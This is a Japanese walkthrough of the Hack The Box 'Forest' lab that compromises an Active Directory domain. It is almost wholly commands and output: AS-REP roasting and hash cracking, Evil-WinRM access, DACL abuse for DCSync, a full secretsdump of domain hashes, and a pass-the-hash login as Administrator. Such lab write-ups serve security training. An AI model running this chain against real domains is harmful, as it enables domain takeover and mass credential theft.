https://app.hackthebox.com/machines/Forest

## STEP 1
```sh
└─$ rustscan -a 10.129.95.210 --scripts none   
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where '404 Not Found' meets '200 OK'.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.210:53
Open 10.129.95.210:88
Open 10.129.95.210:135
Open 10.129.95.210:139
Open 10.129.95.210:389
Open 10.129.95.210:445
Open 10.129.95.210:464
Open 10.129.95.210:593
Open 10.129.95.210:636
Open 10.129.95.210:3268
Open 10.129.95.210:3269
Open 10.129.95.210:5985
Open 10.129.95.210:9389
Open 10.129.95.210:47001
Open 10.129.95.210:49668
Open 10.129.95.210:49664
Open 10.129.95.210:49666
Open 10.129.95.210:49665
Open 10.129.95.210:49671
Open 10.129.95.210:49680
Open 10.129.95.210:49681
Open 10.129.95.210:49685
Open 10.129.95.210:49700
Open 10.129.95.210:49861
10.129.95.210 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49668,49664,49666,49665,49671,49680,49681,49685,49700,49861]
```
```sh
└─$ nmap -n -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49668,49664,49666,49665,49671,49680,49681,49685,49700,49861 10.129.95.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 21:51 EDT
Nmap scan report for 10.129.95.210
Host is up (0.76s latency).

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49680/tcp open  unknown
49681/tcp open  unknown
49685/tcp open  unknown
49700/tcp open  unknown
49861/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.83 seconds
```


## STEP 2
anonymousでユーザ列挙できた
```sh
└─$ netexec smb -u '' -p '' --users 10.129.95.210
SMB         10.129.95.210   445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         10.129.95.210   445    FOREST           [+] htb.local\: 
SMB         10.129.95.210   445    FOREST           -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.95.210   445    FOREST           Administrator                 2021-08-31 00:51:58 0       Built-in account for administering the computer/domain 
SMB         10.129.95.210   445    FOREST           Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.95.210   445    FOREST           krbtgt                        2019-09-18 10:53:23 0       Key Distribution Center Service Account 
SMB         10.129.95.210   445    FOREST           DefaultAccount                <never>             0       A user account managed by the system. 
SMB         10.129.95.210   445    FOREST           $331000-VK4ADACQNUCA          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_2c8eef0a09b545acb          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_ca8c2ed5bdab4dc9b          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_75a538d3025e4db9a          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_681f53d4942840e18          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_1b41c9286325456bb          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_9b69f1b9d2cc45549          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_7c96b981967141ebb          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_c75ee099d0a64c91b          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_1ffab36a2f5f479cb          <never>             0        
SMB         10.129.95.210   445    FOREST           HealthMailboxc3d7722          2019-09-23 22:51:31 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxfc9daad          2019-09-23 22:51:35 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxc0a90c9          2019-09-19 11:56:35 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox670628e          2019-09-19 11:56:45 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox968e74d          2019-09-19 11:56:56 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox6ded678          2019-09-19 11:57:06 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox83d6781          2019-09-19 11:57:17 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxfd87238          2019-09-19 11:57:27 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxb01ac64          2019-09-19 11:57:37 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox7108a4e          2019-09-19 11:57:48 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox0659cc1          2019-09-19 11:57:58 0        
SMB         10.129.95.210   445    FOREST           sebastien                     2019-09-20 00:29:59 0        
SMB         10.129.95.210   445    FOREST           lucinda                       2019-09-20 00:44:13 0        
SMB         10.129.95.210   445    FOREST           svc-alfresco                  2025-07-05 13:17:35 0        
SMB         10.129.95.210   445    FOREST           andy                          2019-09-22 22:44:16 0        
SMB         10.129.95.210   445    FOREST           mark                          2019-09-20 22:57:30 0        
SMB         10.129.95.210   445    FOREST           santi                         2019-09-20 23:02:55 0        
SMB         10.129.95.210   445    FOREST           [*] Enumerated 31 local users: HTB
```
先ほどのユーザからパスワードが設定されているものでasreproastしてみると、svc-alfrescoのチケットを取得できた
```sh
└─$ netexec ldap -u user.txt -p '' --asreproast hash.txt 10.129.95.210
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.129.95.210   389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:b8ac6afe475d465388ca3af9cf81bcc3$562a9861d3d6a745f2cb236bf12aa287ca1c1f82b88e0a28b34f06e85a13f14545828fd51cfa1217285ce79f4944d1c69e892a291e64786906e07dbaab448dd28afe95cec0876e3876182146bc16c0f9c6fdc901cc671f31cbf2385c2181a15df1c57e7d5ec2e9a158a157ce9fd00470b2d0c7e5339070134e309a2f443e65022a13be2019095c9a3c8bdff97d5950e3f7fb41f39585eee3213d784cfd01953208af9e41915f7c3edf1fa999ad49a41614637dbc33f3a587a971312ea2c793cece327931ff0cae9bd1fe20b410d32edb147fc13458bf21c79024897c72463b118afca401a0e
```
ハッシュ形式を確認し、クラック成功！
```sh
└─$ nth -f hash.txt 

  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

$krb5asrep$23$svc-alfresco@HTB.LOCAL:b8ac6afe475d465388ca3af9cf81bcc3$562a9861d3d6a745f2cb236bf12aa287ca1c1f82b88e0a28b34f06e85a13f14545828fd51cfa1217285ce79f4944d1c69e892a291e64786906e07dbaab448dd28afe95cec0876e3876182146bc16c0f9c6fdc9
01cc671f31cbf2385c2181a15df1c57e7d5ec2e9a158a157ce9fd00470b2d0c7e5339070134e309a2f443e65022a13be2019095c9a3c8bdff97d5950e3f7fb41f39585eee3213d784cfd01953208af9e41915f7c3edf1fa999ad49a41614637dbc33f3a587a971312ea2c793cece327931ff0cae9bd1
fe20b410d32edb147fc13458bf21c79024897c72463b118afca401a0e

Most Likely 
Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used for Windows Active Directory
```
```sh
└─$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) Ultra 7 155H, 2099/4263 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$svc-alfresco@HTB.LOCAL:fb19a093db509a3ee92654df112839cc$0dd5ff910de59a4a493ccd35c2041ba09030a48456f83526b167a68de43e50d4296132ad2f1105edc8da7c403622748b1be39d3764d4a55f47692a11a0d3a22a930f99e8fcb2946479c1941a64dc3365574dac8eb90c6809f600b2208d23e3115913bffd939b882f9388e85686bdc9193eb995dbf08ce66477a908f8796d9b1de64b01542b14f87ae923624aa948d694a515631cc65409c9cd226cb15a68665075b64b16d93518a69669a2aa49d762bb1f01165de9a2c1589be998123d0dbf3f38b65a4c663983c0a3f63da157482050b5525bb8bba82e6df2d67699c1981f229f8ac61ba1b3:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:fb19a093db509a...1ba1b3
Time.Started.....: Sat Jul  5 09:42:35 2025 (3 secs)
Time.Estimated...: Sat Jul  5 09:42:38 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1076.1 kH/s (0.74ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4085760/14344385 (28.48%)
Rejected.........: 0/4085760 (0.00%)
Restore.Point....: 4084736/14344385 (28.48%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: s456822 -> s3r3ndipit
Hardware.Mon.#1..: Util: 83%

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => Started: Sat Jul  5 09:42:18 2025
Stopped: Sat Jul  5 09:42:39 2025
```
5985番ポートが開いていたので、取得したクレデンシャルでログイン成功！ユーザフラグゲット
```sh
└─$ evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cat C:\Users\svc-alfresco\Desktop\user.txt
b52be94e8c18f9cdabcfb7709a922a97
```


## STEP 3
netexecでbloodhoundを回す
```sh
└─$ netexec ldap -d htb.local --dns-server 10.129.95.210 -u svc-alfresco -p s3rvice --bloodhound --collection All 10.129.95.210
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
LDAP        10.129.95.210   389    FOREST           [+] htb.local\svc-alfresco:s3rvice 
LDAP        10.129.95.210   389    FOREST           Resolved collection methods: rdp, psremote, dcom, trusts, objectprops, container, localadmin, session, group, acl
LDAP        10.129.95.210   389    FOREST           Done in 01M 58S
LDAP        10.129.95.210   389    FOREST           Compressing output into /home/kali/.nxc/logs/FOREST_10.129.95.210_2025-07-11_213653_bloodhound.zip
```
svc-alfresoの上位グループは、「EXCHANGE WINDOWS PERMISSIONS」グループに対して、GenericAllを持つ  
「EXCHANGE WINDOWS PERMISSIONS」グループは「HTB.LOCAL」に対してWriteDACLを持つ
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Forest_01.png">  
GenericAllを利用して、svc-alfrescoを「EXCHANGE WINDOWS PERMISSIONS」グループに追加できた
```sh
└─$ net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S 10.129.191.172 
                                                                                                                                 
└─$ net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U "htb.local"/"svc-alfresco"%"s3rvice" -S 10.129.191.172
HTB\Exchange Trusted Subsystem
HTB\svc-alfresco
```
WriteDaclを利用して、「HTB.LOCAL」にフルコントロールを得ることができた  
引き続き「DOMAIN ADMINS」にフルコントロールを得ようとしたが、「adminCount=1」とAdminSDHolderだったので先ほどのフルコンが役に立たなかった
```sh
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice' -dc-ip 10.129.191.172
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250711-104639.bak
[*] DACL modified successfully!

└─$ impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'svc-alfresco' -target-dn 'CN=DOMAIN ADMINS,CN=USERS,DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice' -dc-ip 10.129.191.172
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250711-104751.bak
[-] Could not modify object, the server reports insufficient rights: 00000005: SecErr: DSID-03152870, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```
次はDCSync攻撃を行うと、成功！
```sh
└─$ impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice' -dc-ip 10.129.191.172
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250711-210233.bak
[*] DACL modified successfully!

└─$ impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@10.129.191.172
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:b9daf0b0040edc478a2fb9b41a56f943:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
FOREST$:aes256-cts-hmac-sha1-96:6de06ff6f1a4e83d036164dcddb1a32fa41faca30444bb6550ac577b3986955f
FOREST$:aes128-cts-hmac-sha1-96:b77ea8fffb2cd9f24d18209d89c8f126
FOREST$:des-cbc-md5:c8132fbf73c71fa8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...
```
administratorのハッシュでログイン成功！ルートフラグゲット
```powreshell
└─$ evil-winrm -i 10.129.191.172 -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
5c6fa808761efe8e6e847de1d5a6ebb2
```
